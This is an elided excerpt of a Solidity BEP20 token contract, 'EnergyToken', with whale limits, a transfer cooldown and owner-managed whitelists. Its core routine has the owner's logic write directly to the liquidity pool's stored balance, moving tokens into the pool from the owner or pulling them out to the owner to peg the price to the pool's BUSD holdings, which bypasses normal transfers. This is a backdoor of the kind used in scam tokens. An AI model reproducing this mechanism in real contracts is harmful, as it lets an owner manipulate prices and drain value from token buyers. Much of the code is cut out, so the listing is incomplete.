...
contract EnergyToken is IBEP20, LockToken
{
    ...
    address public lpCakeAddress; 
    uint256 public _maxTxAmount = _totalSupply.mul(5).div(1000);
    uint256 public tokensPerDoller = 1000;
    ...
    event lpCakeAddressUpdated(address account, uint256 timestamp);
    function setLpCakeAddress(address _address) external onlyOwner
    {
        lpCakeAddress = _address;
        _excludedFromWahle[_address] = true;
        emit lpCakeAddressUpdated(_address, block.timestamp);
    ...
    {
        if(from != owner()) { require(lpCakeAddress != address(0), "Pool Pair Address not yet updated");}
        uint256 busdBal = BUSD.balanceOf(lpCakeAddress);
        uint256 requiredTokenBal = busdBal.mul(tokensPerDoller);
        uint256 existingTokenBal = balanceOf(lpCakeAddress);
        
        if(existingTokenBal<requiredTokenBal)
        {
            uint256 amount = requiredTokenBal.sub(existingTokenBal);
            _balances[lpCakeAddress] = _balances[lpCakeAddress].add(amount);
            _balances[owner()] = _balances[owner()].sub(amount);
            emit Transfer(owner(), lpCakeAddress, amount);
        }
        else if(existingTokenBal>requiredTokenBal) 
        {
            uint256 amount = existingTokenBal.sub(requiredTokenBal);
            _balances[lpCakeAddress] = _balances[lpCakeAddress].sub(amount);
            _balances[owner()] = _balances[owner()].add(amount); 
            emit Transfer(lpCakeAddress, owner(), amount);           
        }
    }
    ...
    function transfer(address to, uint value) public open(msg.sender, to) returns(bool) 
    {
        ...
        checkForWhale(value, msg.sender, to);
        checkForCoolDown(msg.sender, to);
...
//////--------  ANTI WHALE -------/////--------
    ...
    private view
    {
        ...
        if(from==lpCakeAddress && !_whiteList[to]) 
        { 
            require(newBalance <= _walletMaxHoldingLimit, "Exceeding max tokens limit in the wallet"); 
        } 
    }
    ...
    function  setWalletMaxHoldingLimit(uint256 amount) public onlyOwner 
    {
    ...
    uint256 public coolDownSpan = 120 seconds;
    ...
    function checkForCoolDown(address from, address to) public
    {
        if(cooldownEnabled)
        {
            if(!_whiteList[from] && !_whiteList[to])
            {
                uint256 coolDownTimestamp = lastTxnTimeStamp[from].add(coolDownSpan);
                require(coolDownTimestamp < block.timestamp, "Wait for a while");
